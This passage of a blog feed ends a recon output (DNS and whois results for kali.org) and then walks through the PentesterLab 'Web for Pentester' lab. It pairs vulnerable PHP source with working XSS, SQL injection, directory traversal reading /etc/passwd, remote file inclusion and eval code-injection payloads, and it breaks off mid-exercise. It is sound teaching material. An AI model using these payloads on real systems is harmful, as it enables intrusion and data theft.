<p>archive.kali.org.                        5        IN    CNAME    hera.kali.org.
hera.kali.org.                           5        IN    A        192.99.45.140
bugs.kali.org.                           5        IN    A        198.50.203.236
bugs.kali.org.                           5        IN    A        198.50.203.235
forums.kali.org.                         5        IN    A        192.124.249.12
hermes.kali.org.                         5        IN    A        198.27.70.128
http.kali.org.                           5        IN    CNAME    hebe.kali.org.
hebe.kali.org.                           5        IN    A        192.99.200.113
mail.kali.org.                           5        IN    CNAME    apollo.kali.org.
apollo.kali.org.                         5        IN    A        23.239.31.82
old.kali.org.                            5        IN    CNAME    hermes.kali.org.
hermes.kali.org.                         5        IN    A        198.27.70.128
pan.kali.org.                            5        IN    A        167.114.101.148
shop.kali.org.                           5        IN    A        45.79.147.167
www.kali.org.                            5        IN    A        192.124.249.10</p>

<p>Launching Whois Queries:</p>

<hr />

<p> whois ip result:   23.239.31.0        &ndash;>      23.239.0.0/19
 whois ip result:   45.79.147.0        &ndash;>      45.79.0.0/16
 whois ip result:   167.114.101.0      &ndash;>      167.114.0.0/16
 whois ip result:   192.99.45.0        &ndash;>      192.99.0.0/16
 whois ip result:   192.124.249.0      &ndash;>      192.124.249.0/24
 whois ip result:   198.27.70.0        &ndash;>      198.27.64.0/18
 whois ip result:   198.50.203.0       &ndash;>      198.50.203.0/27</p>

<p>kali.org________</p>

<p> 192.99.0.0/16
 23.239.0.0/19
 45.79.0.0/16
 198.50.203.0/27
 192.124.249.0/24
 167.114.0.0/16
 198.27.64.0/18</p>

<p>kali.org ip blocks:</p>

<hr />

<p> 23.239.31.82/32
 45.79.147.167/32
 167.114.101.148/32
 192.99.45.140/32
 192.99.200.113/32
 192.124.249.10/32
 192.124.249.12/32
 198.27.70.128/32
 198.50.203.235/32
 198.50.203.236/32</p>

<p>done.
```</p>

<p>And today&rsquo;s cow saying is:</p>

<p>``` plain
/ Tomorrow, this will be part of the    \
| unchangeable past but fortunately, it |
\ can still be changed today.           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester/"/>
    <updated>2017-05-04T06:38:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester</id>
    <content type="html"><![CDATA[<p>Today I want to mix things up a bit, and do a challenge focused exclusively on web vulnerabilities. For the target, I will use the Web for Pentester ISO offered by <a href="https://www.pentesterlab.com/">PentesterLab</a>. They host many challenges dedicated to web hacking, and I recommend you give them a try!</p>

<!-- more -->


<p>Navigating to the VM, we are greeted by this page:</p>

<p><img class="center" src="/images/pentest/webpentester/web.png" title="&lsquo;web for pentester&rsquo; &lsquo;web for pentester&rsquo;" ></p>

<p>As you can see, we&rsquo;ve got plenty of exercises, so let&rsquo;s begin!</p>

<h3>XSS</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss1.png" title="&lsquo;xss&rsquo; &lsquo;web for pentester xss 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
<html>
Hello
&lt;?php</p>

<pre><code>echo $_GET["name"];
</code></pre>

<p>?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This is the most basic type of injection:</p>

<p>``` html</p>

<script>alert('there')</script>


<p>```</p>

<p>Now you will get an alert box and if you look in the source, you will see the exact same injection, with no filtering whatsoever.</p>

<p><strong>Example 2</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<p>$name =  $_GET[&ldquo;name&rdquo;];
$name = preg_replace(&ldquo;/<script>/&rdquo;,&ldquo;&rdquo;, $name);
$name = preg_replace(&ldquo;/&lt;\/script>/&rdquo;,&ldquo;&rdquo;, $name);
echo $name;
?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This one looks like the previous one, but in the source, we can see that the script tags are replaced with empty strings, but only for lowercase. I changed the case of the script tags to SCRIPT, and the alert box was back!</p>

<p><strong>Example 3</strong></p>

<p>The source looks like this:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<pre><code>$name =  $_GET["name"];
$name = preg_replace("/&lt;script&gt;/i","", $name);
$name = preg_replace("/&lt;\/script&gt;/i","", $name);
</code></pre>

<p>echo $name;
?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time the script tags are filtered regardless of the case. To see what&rsquo;s going on, I inserted script tags inside a placeholder value:</p>

<p><code>plain
place&lt;script&gt;holder
</code></p>

<p>As expected, they disappear into the abyss, and the message echoed in the page is Hello placeholder . I then tried doubling the script tags:</p>

<p><code>plain
place&lt;&lt;script&gt;&gt;holder
</code></p>

<p>The message changed to <code>Hello place&lt;>holder</code> . This is great, it means we can have nested tags that will be interpreted! I built the payload to:</p>

<p><code>plain
 &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
</code></p>

<p><strong>Example 4</strong></p>

<p>Source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/script/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time, the script throws an error if it sees anything resembling script tags. Luckily, we can get an XSS payload to execute in different ways. For this I used:</p>

<p><code>plain
&lt;img src='nope' onerror="alert('Got ya')" /&gt;
</code></p>

<p><strong>Example 5</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/alert/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>All right, it looks like script tags aren&rsquo;t blacklisted anymore, but this time the alert word is. I just substituted the alert for prompt:</p>

<p>``` plain</p>

<script>prompt('Enter pwn code')</script>


<p>```</p>

<p><strong>Example 6</strong></p>

<p>PHP source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= "<?php  echo $_GET["name"]; ?>";
</script>


<pre><code>&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>```</p>

<p>This time, whatever we place inside the name variable is assigned to a variable. The page source looks like this:</p>

<p>``` html
Hello</p>

<script>
    var $a= "hacker";
</script>


<p>```</p>

<p>We want to build on the existing code and add our own. This means we will have to close the quotes and add our payload. First, I inserted something to see the changes:</p>

<p><code>plain
hacker";INJECTION
</code></p>

<p>And in the HTML code I saw this:</p>

<p><code>plain
var $a= "hacker";INJECTION";
</code></p>

<p>The part up to the first semicolon is what we want, then we have to place our payload, but a stray doublequote and semicolon remain. To get rid of them, I commented them out, and the final injection looked like this:</p>

<p><code>plain
hacker";alert("not enough");//
</code></p>

<p>And in the source it is rendered the following way:</p>

<p><code>plain
var $a= "hacker";alert("not enough");//";
</code></p>

<p><strong>Example 7</strong></p>

<p>PHP code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= '<?php  echo htmlentities($_GET["name"]); ?>';
</script>


<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>It appears that now there is encoding performed on the name variable to prevent the previous type of bypass. Let&rsquo;s see how the source looks with the previous payload:</p>

<p><code>plain
var $a= 'hacker&amp;quot;;alert(&amp;quot;not enough&amp;quot;);//';
</code></p>

<p>The attack was nullified, but if you look at the <code>htmlentities</code> PHP manual page, you will see that, if not otherwise specified, the default flag is ENT_COMPAT, which converts double-quotes and leaves single-quotes alone. So all I had to do was replace the double-quotes with single-quotes:</p>

<p><code>plain
hacker';alert('still not enough');//
</code></p>

<p>And this is translated in the HTML as:</p>

<p><code>plain
var $a= 'hacker';alert('stillnot enough');//';
</code></p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss8.png" title="&lsquo;xss 8&rsquo; &lsquo;web for pentester xss 8&rsquo;" ></p>

<p>This looks a little different, we input something and it gets echoed back in a greeting: HELLO something</p>

<p>Source code:</p>

<p>``` php
&lt;?php
  require_once &lsquo;../header.php&rsquo;;</p>

<p>  if (isset($_POST[&ldquo;name&rdquo;])) {</p>

<pre><code>echo "HELLO ".htmlentities($_POST["name"]);
</code></pre>

<p>  }
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>&ldquo; method="POST&rdquo;>
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/></p>

<p>&lt;?php</p>

<p>  require_once &lsquo;../footer.php&rsquo;;</p>

<p>?>
```</p>

<p>PHP_SELF returns the currently executing script and its path from the root folder. In our case, where the URL is <a href="http://192.168.217.138/xss/example8.php">http://192.168.217.138/xss/example8.php</a> , PHP_SELF would be /xss/example8.php .</p>

<p><a href="http://form.guide/php-form/php-form-action-self.html">The PHP_SELF variable</a> is vulnerable to XSS if not enclosed within htmlentities(). Which means we can put our payload in the URL: <a href="http://192.168.217.138/xss/example8.php/INJECTION">http://192.168.217.138/xss/example8.php/INJECTION</a></p>

<p>Now, we need to take note of how to build the payload:</p>

<p><code>html
HELLO hacker&lt;form action="/xss/example8.php/hacker" method="POST"&gt;
</code></p>

<p>My successful injection was:</p>

<p><code>plain
hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"
</code></p>

<p>And the source now looks like this:</p>

<p><code>html
&lt;form action="/xss/example8.php/hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"" method="POST"&gt;
</code></p>

<p>The first double-quote and <code>></code> closed the form action part, then came the injection, and then I put another double-quote to keep company to the stray one that remained.</p>

<p><strong>Example9</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss9.png" title="&lsquo;xss 9&rsquo; &lsquo;dom xss&rsquo;" ></p>

<p>Whatever we put after the pound sign gets rendered on the page. Here&rsquo;s the code that does it:</p>

<p>``` html</p>

<script>
  document.write(location.hash.substring(1));
</script>


<p>```</p>

<p>First, we have to understand the <a href="https://www.w3schools.com/jsref/jsref_substring.asp">substring</a> method:</p>

<blockquote><p> string.substring(start, end)</p>

<p>This method extracts the characters in a string between &ldquo;start&rdquo; and &ldquo;end&rdquo;, not including &ldquo;end&rdquo; itself.
Characters start at index 0</p></blockquote>

<p>And the <a href="https://www.w3schools.com/jsref/prop_loc_hash.asp">location.hash</a> returns the anchor part of the URL. So if our URL is <a href="http://192.168.217.138/xss/example9.php#moo">http://192.168.217.138/xss/example9.php#moo</a> , it will return #moo . And combined with the substring function, whatever comes after the hash is written to the page, as we saw at the beginning.</p>

<p>This page is vulnerable to DOM-based XSS, where a modification the DOM environment affects how the client code is running. Just put the payload after the hash sign, and reload the page (I had to use Chrome to see the alert):</p>

<p><code>plain
http://192.168.217.138/xss/example9.php#&lt;script&gt;alert('Bye')&lt;/script&gt;
</code></p>

<h3>SQL injections</h3>

<p><strong>Example1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql1.png" title="&lsquo;sqli&rsquo; &lsquo;sql injection&rsquo;" ></p>

<p>Ok, before tampering with anything, let&rsquo;s look at the source:</p>

<p>``` php
&lt;?php</p>

<p>  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";  
$result = mysql_query($sql);
if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
</code></pre>

<p>  require_once &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>So, the code looks in the users table for whatever we give it, and if a match is found, it displays some info. You can see there is no filtering on our input, and the DB query is <code>SELECT * FROM users where name=&lsquo;input&rsquo;</code>. This is trivial to bypass, by using <code>root' or 1=1&mdash; </code> (there is a space after &mdash;), and don&rsquo;t forget to URL encode for it to work! The query now becomes <code>SELECT * FROM users where name=&lsquo;root&rsquo; or 1=1&mdash; &lsquo;</code>, and the stray quote is commented out.</p>

<p><img class="center" src="/images/pentest/webpentester/sqlinj1.png" title="&lsquo;sqli&rsquo; &lsquo;sqli results&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>This example looks the same like the previous one, but the difference is in the code:</p>

<p>``` php
if (preg_match(&lsquo;/ /&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Basically, the space characters are being filtered out. However, we can achieve the same results by using tabs (<code>\t</code>), which would change the previous injection to: <code>SELECT * FROM users where name=&lsquo;root&rsquo; or  1=1#</code>, where the same outcome is achieved by substituting the spaces for tabs and the comment characters from <code>&mdash; </code> to <code>#</code>. Again, don&rsquo;t forget URL encoding though!</p>

<p><strong>Example3</strong></p>

<p>Same-looking page, but slightly different code:</p>

<p>``` php
if (preg_match(&lsquo;/\s+/&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>This time, a regular expression prevents the use of any whitespace characters, including tabs, carriage returns, etc. It is possible to bypass this by using <a href="http://www.sqlinjection.net/comments/">C-style comments</a>: <code>/**/</code>. Here, our injection would be:</p>

<p><code>plain
'/**/or/**/1=1#
</code></p>

<p>And the DB query would look like this:</p>

<p><code>sql
SELECT * FROM users where name='root'/**/or/**/1=1#'
</code></p>

<p>As always, don&rsquo;t forget to URL encode when injecting!</p>

<p><strong>Example4</strong></p>

<p>Here, the URL looks just a tiny bit different: <a href="http://192.168.217.138/sqli/example4.php?id=2">http://192.168.217.138/sqli/example4.php?id=2</a></p>

<p>And the code:</p>

<p>``` php
$sql=&ldquo;SELECT * FROM users where id=&rdquo;;</p>

<pre><code>$sql.=mysql_real_escape_string($_GET["id"])." ";
$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>So, the query performed is <code>SELECT * FROM users where id=INPUT </code>, but this time, the <code>mysql_real_escape_string</code> function is used to escape the characters: <code>\x00, \n, \r, \, &lsquo;, &ldquo; and \x1a</code>. All that protection is for naught however, because the id parameter is an integer, where there is no need to use quotes. So I injected <code>2 or 1=1&mdash; </code> and again saw all results.</p>

<p><strong>Example5</strong></p>

<p>We have the same example as the previous one, but with some modifications to the underlying code:</p>

<p>``` php
if (!preg_match(&lsquo;/^[0-9]+/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>The regular expression will make the script throw an error and stop executing if it encounters non-integer characters in the input. But the check is only made at the beginning of the input, as can be seen from the fact that there is a <code>^</code>, but not a <code>$</code> delimiter for the end. Again, the injection is trivial: <code>id=2 or 1=1&mdash; </code>.</p>

<p><strong>Example6</strong></p>

<p>The developer tried to fix the previous mistake with:</p>

<p>``` php
if (!preg_match(&lsquo;/[0-9]+$/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;


$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Now the code checks for the end of the string to be an integer, but not for the beginning xD Well, we can inject without worrying that we have to comment something afterwards: <code>id=2 or 1=1</code></p>

<p><strong>Example7</strong></p>

<p>Finally, the code checks for integers both at the beginning and the end:</p>

<p>``` php
if (!preg_match(&lsquo;/^&ndash;?[0-9]+$/m&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"];

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>There is something new in this regex: a PCRE_MULTILINE pattern modifier. Let&rsquo;s see what this does:</p>

<blockquote><p> m (PCRE_MULTILINE)</p>

<p>   By default, PCRE treats the subject string as consisting of a single &ldquo;line&rdquo; of characters
(even if it actually contains several newlines). The &ldquo;start of line&rdquo; metacharacter (^) matches
only at the start of the string, while the &ldquo;end of line&rdquo; metacharacter ($) matches only at the
end of the string, or before a terminating newline (unless D modifier is set). This is the same
as Perl. When this modifier is set, the &ldquo;start of line&rdquo; and &ldquo;end of line&rdquo; constructs match
immediately following or immediately before any newline in the subject string, respectively, as
well as at the very start and end. This is equivalent to Perl&rsquo;s /m modifier. If there are no
&ldquo;\n&rdquo; characters in a subject string, or no occurrences of ^ or $ in a pattern, setting this
modifier has no effect.</p></blockquote>

<p>So, the regex checks will be performed correctly on the first line, but we can insert new lines and inject our payload there, and no checks will be performed! With the payload <code>id=2%0A or 1=1</code>, a new line has been injected, and then the rest of the payload.</p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql8.png" title="&lsquo;sqli&rsquo; &lsquo;sqli 8&rsquo;" ></p>

<p>This example introduces the ORDER BY statement:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY `";
$sql .= mysql_real_escape_string($_GET["order"])."`";
$result = mysql_query($sql);
</code></p>

<p>The SQL query looks like this:</p>

<p><code>sql
SELECT * FROM users ORDER BY `INPUT`;
</code></p>

<p>For this exploitation, I used <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">this very helpful article about time-based injection in the ORDER BY clause</a>:</p>

<p><code>plain
order=name`,(select sleep(3) from dual where database() like database())#
</code></p>

<p>First, the successful injection will be reflected by the time it takes to load the page, specified inside the <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep">SLEEP</a> function. The <a href="http://www.w3resource.com/sql/sql-dual-table.php">DUAL table</a> is a special table that can be used in queries that don&rsquo;t need data from any tables. <a href="http://www.bitbybit.dk/carsten/blog/?p=201">DATABASE()</a> returns the value of the currently selected  DB, and the <a href="https://www.tutorialspoint.com/sql/sql-like-clause.htm">LIKE</a> operator is used to compare a value with another similar one. For the injection to work, don&rsquo;t forget to URL encode! Now, let&rsquo;s see how the full query would look like:</p>

<p><code>sql
SELECT * FROM users ORDER BY `name`,(select sleep(3) from dual where database() like database())#`;
</code></p>

<p>That LIKE statement is useful, because it induces a condition that is matched by the SELECT statement.</p>

<p><strong>Example9</strong></p>

<p>Source code:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY ";
$sql .= mysql_real_escape_string($_GET["order"]);
$result = mysql_query($sql);
</code></p>

<p>No more backticks here. I used the same payload as in the previous example, but without the backticks (and URL encoded):</p>

<p><code>plain
order=(select sleep(3) from dual where database() like database())#
</code></p>

<h3>Directory traversal</h3>

<p><strong>Example1</strong></p>

<p>If you inspect the image link, you will see: <code>dirtrav/example1.php?file=hacker.png</code>. The source code for this challenge is:</p>

<p>``` php
&lt;?php</p>

<p>$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file;</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>header(&lsquo;Cache-Control: must-revalidate, post-check=0, pre-check=0&rsquo;);
header(&lsquo;Cache-Control: public&rsquo;);
header(&lsquo;Content-Disposition: inline; filename=&ldquo;&rsquo; . basename($path) . &lsquo;&rdquo;;&rsquo;);
header(&lsquo;Content-Transfer-Encoding: binary&rsquo;);
header(&lsquo;Content-Length: &rsquo; . filesize($path));</p>

<p>$handle = fopen($path, &lsquo;rb&rsquo;);</p>

<p>do {
$data = fread($handle, 8192);
if (strlen($data) == 0) {
break;
}
echo($data);
} while (true);</p>

<p>fclose($handle);
exit();</p>

<p>?>
```</p>

<p>There is no filtering involved, so I displayed the <em>/etc/passwd</em> file with: <a href="http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd">http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd</a></p>

<p><img class="center" src="/images/pentest/webpentester/passwd.png" title="&lsquo;passwd file&rsquo; &lsquo;passd file&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The path for this one is <code>dirtrav/example2.php?file=/var/www/files/hacker.png</code>. In the code, we are only interested in the parts that manipulate the file to be included:</p>

<p>``` php
$file = $_GET[&lsquo;file&rsquo;];</p>

<p>if (!(strstr($file,&ldquo;/var/www/files/&rdquo;)))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The script tries to enforce the location of the file to be in /var/www/files, but we can leave it as it is and just go up a few directories and include the passwd file again: <code>file=/var/www/files/../../../etc/passwd</code>.</p>

<p><strong>Example 3</strong></p>

<p>Here is the path: <code>dirtrav/example3.php?file=hacker</code></p>

<p>And the code:</p>

<p>``` php
$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file.&ldquo;.png&rdquo;;
// Simulate null-byte issue that used to be in filesystem related functions in PHP
$path = preg_replace(&lsquo;/\x00.*/&rsquo;,&ldquo;&rdquo;,$path);</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The code gives the hint of exploiting this: the null byte, which will make the system ignore anything that comes after it. So the extension check will be bypassed: <code>file=../../../../../etc/passwd%00</code></p>

<h3>File Include</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/fileinc.png" title="&lsquo;file includes&rsquo; &lsquo;file inclusion&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
    include($_GET["page"]);

} 
</code></pre>

<p>?>
```</p>

<p>There is no validation performed on the file to be included. For this challenge, PentesterLab provides a sample include file that calls phpinfo() at <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></p>

<p>Just include the above file to see the output of phpinfo(): <code>page=<a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></code></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The URL is slightly different now: <a href="http://192.168.217.138/fileincl/example2.php?page=intro">http://192.168.217.138/fileincl/example2.php?page=intro</a></p>

<p>And the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
$file = $_GET["page"].".php";
// simulate null byte issue
$file = preg_replace('/\x00.*/',"",$file);
    include($file);
} 
</code></pre>

<p>?>
```</p>

<p>So the code automatically appends a PHP extension to the file, but is also vulnerable to null bytes. I included the same file as in the previous example, with a <code>%00</code> at the end: <code>page=<a href="http://assets.pentesterlab.com/test_include.txt%00">http://assets.pentesterlab.com/test_include.txt%00</a></code></p>

<h3>Code injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php
  $str=&ldquo;echo \"Hello &rdquo;.$_GET[&lsquo;name&rsquo;].&ldquo;!!!\&rdquo;;&ldquo;;</p>

<p>  eval($str);
?>
```</p>

<p>The string <code>echo &ldquo;Hello hacker!!!&rdquo;;</code> is passed to eval. Whatever else we input after the name variable comes right after hacker and before the exclamation signs: Hello hacker@!!! (with an example of adding @ after hacker). However, if we input a double-quote, we get an error:</p>

<p><code>plain
Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1
</code></p>

<p>That is because eval now has to evaluate the broken syntax of <code>echo &ldquo;Hello hacker&rdquo;!!!&ldquo;;</code>. We can take advantage of this by appending a command and then commenting out the remaining <code>!!!&rdquo;;</code>:</p>

<p><code>plain
name=hacker" . system('hostname');//
</code></p>

<p>URL encode it and you will see the output:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1 success&rsquo;" ></p>

<p>This worked because what eval saw was: <code>echo &ldquo;Hello hacker&rdquo; . system(&lsquo;hostname&rsquo;);//!!!&ldquo;;</code></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code2.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 2&rsquo;" ></p>

<p>PHP code:</p>

<p>``` php
&lt;?php
class User{
  public $id, $name, $age;
  function __construct($id, $name, $age){</p>

<pre><code>$this-&gt;name= $name;
$this-&gt;age = $age;
$this-&gt;id = $id;
</code></pre>

<p>  } <br/>
}
  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;../sqli/db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users ";

$order = $_GET["order"];
$result = mysql_query($sql);
</code></pre>

<p>  if ($result) {</p>

<pre><code>    while ($row = mysql_fetch_assoc($result)) {
  $users[] = new User($row['id'],$row['name'],$row['age']);
}
if (isset($order)) { 
  usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
}
}   

    ?&gt;
</code></pre>

<table class='table table-striped' >
        <tr>
            <th><a href="example2.php?order=id">id</th>
            <th><a href="example2.php?order=name">name</th>
            <th><a href="example2.php?order=age">age</th>
        </tr>
        <?php

    foreach ($users as $user) {  
            echo "<tr>";
                echo "<td>".$user->id."</td>";
                echo "<td>".$user->name."</td>";
                echo "<td>".$user->age."</td>";
            echo "</tr>";
        }   
        echo "</table>


<p>  require &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>The line to focus on is:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>Here, the <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">PentesterLab course</a> explains the vulnerability exists in the <a href="https://secure.php.net/manual/en/function.usort.php">usort(array, user-defined function)</a> function, because it uses <a href="https://secure.php.net/manual/en/function.create-function.php">create_function(args, code)</a>, which is used to create an anonymous (lambda-style) function. <strong>create_function</strong> is vulnerable to unfiltered input because it uses eval() at its core. There is a known <a href="http://www.exploitalert.com/view-details.html?id=10264">exploit</a> that allows code injection and executing the code without creating and calling the function. Let&rsquo;s see how this works:</p>

<p><strong>create_function</strong> is a ZEND_FUNCTION defined in <em>zend_builtin_functions.c</em>. Here is part of the vulnerable code:</p>

<p><img class="center" src="/images/pentest/webpentester/ffs.png" title="&lsquo;c code&rsquo; &lsquo;vulnerable code&rsquo;" ></p>

<p>The folks at PentesterLab were nice enough to help me understand this, I was in one of those states where you don&rsquo;t see the forest from the trees! Basically, the code for the lambda function is the string inside curly brackets, and there is no filtering for {}. So later, this same user-supplied string gets evaluated by zend_eval_string. We can inject code in the $order parameter, so our code gets in this line:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>And that line will be used in the format string. The payload I used is : <code>order=id);}echo &lsquo;INJECTION SUCCESSFUL&rsquo;;//</code>. Now, inside eval(), the lambda function without injection looks something like this:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');}
</code></p>

<p>Let&rsquo;s deconstruct it step by step. Adding <strong>);</strong> closes the call to strcmp, but leaves garbage behind and also an unclosed {} , because the end curly bracket is now part of the discarded code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');,$b-&gt;'.$order.');}
</code></p>

<p>Adding a closing curly bracket correctly closes the format string, so now we have:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');},$b-&gt;'.$order.');}
</code></p>

<p>To test where I was with the injection, I left it at that and got this error:</p>

<p><code>plain
Parse error: syntax error, unexpected ',' in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22
</code></p>

<p>So the code picks up after the curly bracket, we know we have to comment out the rest. And between the curly bracket and the comment characters we can put our code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');}echo 'INJECTION SUCCESSFUL';//,$b-&gt;'.$order.');}
</code></p>

<p>And the result:</p>

